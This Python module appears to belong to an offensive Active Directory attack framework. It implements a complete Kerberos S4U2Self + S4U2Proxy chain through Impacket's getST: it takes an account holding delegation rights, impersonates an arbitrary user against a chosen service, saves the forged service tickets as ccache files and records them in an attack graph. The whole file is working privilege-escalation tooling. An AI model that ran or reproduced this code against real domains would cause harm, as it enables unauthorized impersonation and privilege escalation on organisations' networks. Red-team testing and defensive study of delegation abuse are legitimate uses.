"""S4U2Self + S4U2Proxy end-to-end chain.

Given a controlled account with delegation rights (msDS-AllowedToDelegateTo,
RBCD, or self-delegation), request a service ticket that impersonates an
arbitrary user against the specified SPN.
"""

from __future__ import annotations

import json
import os
from typing import Any

from rich.console import Console

from adaf_attack.core.graph import AttackGraph
from adaf_attack.core.impacket_helper import require_impacket
from adaf_attack.core.registry import register_capability
from adaf_attack.core.session import Session
from adaf_attack.core.target import Target

console = Console()


@register_capability(
    id="s4u-abuse",
    summary="Full S4U2Self + S4U2Proxy chain (constrained delegation / RBCD abuse)",
    category="privilege-escalation",
    tags=("kerberos", "s4u", "constrained-delegation", "rbcd"),
    destructive=False,
)
class S4uAbuse:
    def run(
        self,
        target: Target,
        session: Session,
        graph: AttackGraph,
        *,
        include_secrets: bool = False,
        force: bool = False,
        **kwargs: Any,
    ) -> dict[str, Any]:
        require_impacket("s4u-abuse")
        impersonate = kwargs.get("impersonate")
        spn = kwargs.get("spn")
        additional_ticket = kwargs.get("additional_ticket")
        altservice = kwargs.get("altservice")
        if not impersonate or not spn:
            raise RuntimeError("Requires -P impersonate=<user> and -P spn=<service/host>.")
        if not target.username or not target.has_credentials:
            raise RuntimeError("s4u-abuse requires --username plus password/hash/aes/ccache.")

        console.print(
            f"[bold]S4U chain[/bold] {target.username} → impersonate {impersonate} → {spn}"
        )

        from impacket.examples.getST import GETST

        options = _GetSTOptions(
            identity=f"{target.domain}/{target.username}",
            spn=spn,
            impersonate=impersonate,
            additional_ticket=additional_ticket,
            altservice=altservice,
            dc_ip=target.dc_ip,
            k=target.use_kerberos,
            no_pass=not target.password and not target.hashes and not target.aes_key,
            hashes=target.hashes or "",
            aesKey=target.aes_key or "",
            debug=False,
            self_flag=bool(kwargs.get("self_flag")),
            u2u=bool(kwargs.get("u2u")),
            renewable_life="",
            renewable=False,
            force_forwardable=False,
            renew=False,
        )
        out_dir = session.path("s4u")
        os.makedirs(out_dir, exist_ok=True)
        os.chdir(out_dir)
        try:
            executor = GETST(target.password or "", target.domain, options)
            executor.run()
        finally:
            pass

        ccaches = [str(out_dir / n) for n in os.listdir(out_dir) if n.endswith(".ccache")]
        node = f"USER@{impersonate.upper()}@{target.domain.upper()}"
        graph.add_node(node, "User", sam=impersonate, source="s4u")
        graph.add_edge(node, node, "HasS4UTicket", spn=spn)

        result = {
            "impersonate": impersonate,
            "spn": spn,
            "additional_ticket": additional_ticket,
            "altservice": altservice,
            "ccache_paths": ccaches,
        }
        out = session.path("s4u-abuse.json")
        out.write_text(json.dumps(result, indent=2, default=str), encoding="utf-8")
        graph.save(session.path("graph.json"))
        session.log("s4u-abuse.complete", impersonate=impersonate, spn=spn)
        console.print(f"[green]Done[/green]  ccaches={len(ccaches)}")
        return result


class _GetSTOptions:
    def __init__(self, **kw: Any) -> None:
        for key, val in kw.items():
            setattr(self, key, val)
